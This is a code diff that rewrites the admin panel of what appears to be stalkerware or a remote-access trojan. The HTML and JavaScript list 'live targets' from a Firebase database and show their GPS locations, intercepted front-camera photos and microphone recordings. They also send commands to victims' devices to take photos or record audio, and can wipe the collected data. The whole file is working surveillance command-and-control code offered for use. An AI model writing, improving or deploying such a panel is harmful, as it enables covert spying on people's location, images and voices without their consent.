@@ -1,123 +1,179 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Ghost Admin Pro - AUTO SYNC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER-COMMAND v2.0 | ADMIN</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; height: 100vh; margin: 0; }
-        #sidebar { width: 300px; border-right: 2px solid #0f0; padding: 20px; background: #050505; overflow-y: auto; }
-        #main { flex: 1; display: flex; flex-direction: column; background: #000; }
-        .target-item { padding: 10px; border: 1px solid #333; margin-bottom: 5px; cursor: pointer; font-size: 14px; }
-        .target-item:hover { border-color: #0f0; background: #010; }
-        .active-target { background: #020; border-color: #0f0; box-shadow: 0 0 10px #0f0; }
-        #feed { flex: 1; padding: 20px; overflow-y: auto; border-top: 1px solid #0f0; }
-        .btn { width: 100%; padding: 10px; margin: 5px 0; background: #050; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; }
-        img { width: 200px; border: 1px solid #0f0; margin: 5px; }
-        audio { filter: invert(1); width: 100%; margin-top: 10px; }
+        :root { --neon: #00ff41; --bg: #050505; --card: #111; --border: #222; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        
+        /* Scanning Animation */
+        body::after {
+            content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 2px;
+            background: rgba(0, 255, 65, 0.2); z-index: 9999;
+            animation: scan 3s linear infinite; pointer-events: none;
+        }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        .dashboard { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }
+        
+        /* Sidebar */
+        .sidebar { border-right: 1px solid var(--border); padding: 20px; overflow-y: auto; background: #080808; }
+        .target-item { 
+            padding: 12px; border: 1px solid var(--border); margin-bottom: 10px; cursor: pointer;
+            transition: 0.3s; border-radius: 4px; position: relative;
+        }
+        .target-item:hover { border-color: var(--neon); background: rgba(0,255,65,0.05); }
+        .target-item.active { border-left: 5px solid var(--neon); background: rgba(0,255,65,0.1); }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .online { background: var(--neon); box-shadow: 0 0 10px var(--neon); }
+
+        /* Main Console */
+        .console { padding: 25px; overflow-y: auto; display: flex; flex-direction: column; gap: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+        
+        /* Control Buttons Section */
+        .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; }
+        .btn { 
+            background: transparent; border: 1px solid var(--neon); color: var(--neon); 
+            padding: 10px; cursor: pointer; text-transform: uppercase; font-weight: bold;
+            transition: 0.3s;
+        }
+        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+        .btn:disabled { border-color: #444; color: #444; cursor: not-allowed; }
+
+        /* Data Sections Grid */
+        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .data-box { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 15px; min-height: 200px; }
+        .data-box h3 { margin: 0 0 15px 0; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px; color: #fff; }
+
+        /* Image & Audio Styling */
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
+        .gallery img { width: 100%; border-radius: 4px; border: 1px solid #333; cursor: pointer; }
+        .gallery img:hover { border-color: var(--neon); }
+        audio { width: 100%; filter: invert(1); height: 30px; margin-bottom: 5px; }
+
+        .info-txt { font-size: 13px; color: #888; margin: 5px 0; }
+        .info-txt b { color: var(--neon); }
     </style>
 </head>
 <body>
 
-<div id="sidebar">
-    <h3 style="text-align: center;">LIVE TARGETS</h3>
-    <div id="targetList">Scanning for signals...</div>
-    <hr style="border-color: #0f0;">
-    <div id="controls" style="display:none;">
-        <p>Selected: <span id="curTid" style="color:#fff;">None</span></p>
-        <button class="btn" onclick="sendCmd('photo_front')">FRONT PHOTO</button>
-        <button class="btn" onclick="sendCmd('photo_back')">BACK PHOTO</button>
-        <button class="btn" onclick="sendCmd('audio_record')">RECORD 30S AUDIO</button>
-        <button class="btn" style="background:#400; color:#f00;" onclick="deleteTarget()">DELETE</button>
+<div class="dashboard">
+    <div class="sidebar">
+        <h2 style="font-size: 18px; letter-spacing: 2px;">LIVE_SCANNER</h2>
+        <div id="target-list">
+            <p style="color:#444;">Searching for signals...</p>
+        </div>
     </div>
-</div>
 
-<div id="main">
-    <div style="height: 250px; border-bottom: 1px solid #0f0;">
-        <iframe id="map" width="100%" height="100%" frameborder="0" style="filter: grayscale(1) invert(1);"></iframe>
-    </div>
-    <div id="feed">
-        <div id="locInfo" style="color: #0f0; font-weight: bold; margin-bottom: 10px;">Waiting for GPS...</div>
-        <hr>
-        <h4>GALLERY</h4>
-        <div id="gallery"></div>
-        <hr>
-        <h4>AUDIO INTERCEPTS</h4>
-        <div id="audios"></div>
+    <div class="console">
+        <div class="header">
+            <h1 id="selected-id">SELECT_TARGET</h1>
+            <div id="live-status">OFFLINE</div>
+        </div>
+
+        <div class="controls">
+            <button class="btn" onclick="triggerCmd('photo')">Capture Cam</button>
+            <button class="btn" onclick="triggerCmd('audio')">Record Mic</button>
+            <button class="btn" onclick="openMap()">Get GPS</button>
+            <button class="btn" style="border-color: #ff3131; color: #ff3131;" onclick="clearData()">Wipe Data</button>
+        </div>
+
+        <div class="data-grid">
+            <div class="data-box">
+                <h3>TARGET_INFO</h3>
+                <div id="target-details">
+                    <p class="info-txt">Select a target to see system logs...</p>
+                </div>
+            </div>
+
+            <div class="data-box">
+                <h3>VOICE_LOGS</h3>
+                <div id="audio-logs" class="gallery" style="display:block;">
+                    <p class="info-txt">Waiting for audio packets...</p>
+                </div>
+            </div>
+
+            <div class="data-box" style="grid-column: span 2;">
+                <h3>VISUAL_FEED (FRONT_CAM)</h3>
+                <div id="photo-logs" class="gallery">
+                    <p class="info-txt">No visual data intercepted.</p>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+    firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     let currentTid = null;
+    let mapLink = "";
 
+    // Target List Scanner
     db.ref('targets').on('value', snap => {
-        const listDiv = document.getElementById('targetList');
-        listDiv.innerHTML = "";
-        const data = snap.val();
-        if(!data) { listDiv.innerHTML = "No targets online."; return; }
-
-        for(let id in data) {
+        const list = document.getElementById('target-list');
+        list.innerHTML = "";
+        snap.forEach(child => {
+            const tid = child.key;
+            const data = child.val();
             const div = document.createElement('div');
-            div.className = 'target-item' + (id === currentTid ? ' active-target' : '');
-            div.innerText = "📡 ID: " + id;
-            div.onclick = () => selectTarget(id);
-            listDiv.appendChild(div);
-        }
+            div.className = `target-item ${currentTid === tid ? 'active' : ''}`;
+            div.innerHTML = `<span class="status-dot online"></span> ${tid}<br><small style="color:#666">${data.info?.time || ''}</small>`;
+            div.onclick = () => loadTarget(tid);
+            list.appendChild(div);
+        });
     });
 
-    function selectTarget(id) {
-        currentTid = id;
-        document.getElementById('curTid').innerText = id;
-        document.getElementById('controls').style.display = "block";
-        document.getElementById('gallery').innerHTML = "";
-        document.getElementById('audios').innerHTML = "";
+    function loadTarget(tid) {
+        currentTid = tid;
+        document.getElementById('selected-id').innerText = "TARGET: " + tid;
+        document.getElementById('live-status').innerHTML = "<span class='online status-dot'></span> ACTIVE_LINK";
         
-        // --- FIXED LOCATION LISTENER ---
-        db.ref('targets/' + id + '/location').on('value', (snap) => {
-            const loc = snap.val();
-            if (loc) {
-                // locDisplay ki jagah locInfo use karein (jo HTML mein hai)
-                document.getElementById('locInfo').innerHTML = 
-                    `LAT: ${loc.lat} | LNG: ${loc.lng} <br> TIME: ${loc.last_seen || 'N/A'}`;
-                
-                // 1{loc.lat} ko theek karke standard Google Maps link banaya
-                const mapUrl = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
-                document.getElementById('map').src = mapUrl;
-            }
+        // Listen to Data
+        db.ref(`targets/${tid}/info`).on('value', s => {
+            const d = s.val();
+            document.getElementById('target-details').innerHTML = d ? 
+                `<p class="info-txt"><b>Device:</b> ${d.device}</p><p class="info-txt"><b>Status:</b> ${d.status}</p><p class="info-txt"><b>Last:</b> ${d.time}</p>` : "";
         });
 
-        db.ref('targets/' + id + '/photos').on('child_added', s => {
-            const img = document.createElement('img');
-            img.src = s.val().img || s.val().image;
-            document.getElementById('gallery').prepend(img);
+        db.ref(`targets/${tid}/location`).on('value', s => {
+            const d = s.val();
+            if(d) mapLink = `https://www.google.com/maps?q=${d.lat},${d.lng}`;
         });
 
-        db.ref('targets/' + id + '/audios').on('child_added', s => {
-            const aud = document.createElement('audio');
-            aud.controls = true;
-            aud.src = s.val().audio || s.val().data;
-            document.getElementById('audios').prepend(aud);
+        db.ref(`targets/${tid}/photos`).on('value', s => {
+            const box = document.getElementById('photo-logs');
+            box.innerHTML = "";
+            s.forEach(p => {
+                box.innerHTML += `<img src="${p.val().img}" onclick="window.open(this.src)">`;
+            });
+        });
+
+        db.ref(`targets/${tid}/audios`).on('value', s => {
+            const box = document.getElementById('audio-logs');
+            box.innerHTML = "";
+            s.forEach(a => {
+                box.innerHTML += `<audio controls src="${a.val().audio}"></audio>`;
+            });
         });
     }
 
-    function sendCmd(act) {
-        if(!currentTid) return;
-        db.ref('commands/' + currentTid).set({ action: act, time: Date.now() });
-        alert("Command Sent: " + act);
+    function triggerCmd(act) {
+        if(!currentTid) return alert("Select Target!");
+        db.ref(`commands/${currentTid}`).set({ action: act, t: Date.now() });
     }
 
-    function deleteTarget() {
-        if(currentTid && confirm("Delete data?")) {
-            db.ref('targets/' + currentTid).remove();
-            db.ref('commands/' + currentTid).remove();
-            location.reload();
-        }
+    function openMap() { if(mapLink) window.open(mapLink); else alert("GPS not found!"); }
+    
+    function clearData() {
+        if(currentTid && confirm("Wipe Target Data?")) db.ref(`targets/${currentTid}`).remove();
     }
 </script>
 </body>
 </html>
-
